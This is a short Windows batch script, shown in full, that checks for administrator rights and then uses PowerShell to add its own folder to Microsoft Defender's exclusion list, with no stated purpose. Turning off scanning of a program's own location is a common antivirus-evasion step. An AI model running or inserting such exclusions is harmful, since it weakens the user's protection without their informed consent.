@echo off
setlocal enabledelayedexpansion
cd %~dp0
cls

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if %errorlevel% neq 0 (
    echo Please run as Administrator
    pause >nul 2>&1
    exit /b
)

powershell -Command Add-MpPreference -ExclusionPath "%CD%"
exit /b